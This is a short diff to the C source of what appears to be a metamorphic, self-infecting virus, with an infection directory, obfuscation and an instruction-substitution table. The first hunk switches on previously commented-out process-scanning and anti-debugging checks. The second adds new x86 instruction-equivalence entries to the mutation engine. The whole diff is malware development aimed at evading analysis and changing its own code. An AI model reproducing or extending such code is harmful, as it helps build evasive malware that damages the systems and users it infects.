@@ -7,10 +7,10 @@ int   entry_point(void *magic) {
   char    infectDir2[] = "/tmp/test2";
   char    procName[] = "/proc/";
 
-  /* if (checkProcess(procName) != 0) */
-  /*   return (stop(1, magic)); */
-  /* if (preventDebug(magic) != 0) */
-  /*   return (stop(1, magic)); */
+  if (checkProcess(procName) != 0)
+    return (stop(1, magic));
+  if (preventDebug(magic) != 0)
+    return (stop(1, magic));
   if (magic != (void *)0x42) {
     if (unObfuscate() == -1)
       return (stop(1, magic));
@@ -718,6 +718,9 @@ const char  instructions[][MAX_INS_SIZE] __attribute__ ((section (".text#"))) = 
   "\x02",
   "\x0f\xb6\x01\x02\x00\x00\x21\x02\x00\x00\x00\x02\x00\x00\x60\x02", // MOVZX r32, r/m8
   "\x8a\x01\x90\x02\x00\x21\x00\x02\x00\x00\x00\x02\x00\xe0\x00\x02", // MOV r8, r/m8 \n\t NOP
+  "\x02",
+  "\x48\x63\x01\x02\x00\x00\x21\x02\x00\x00\xc0\x02\x00\x00\x00\x02", // MOVSXD r64, r/m32
+  "\x89\x01\x90\x02\x00\x0c\x00\x02\x00\xc0\x00\x02\x00\x00\x00\x02", // MOV r32, r/m32 \n\t NOP
   "\x02"
 };
 
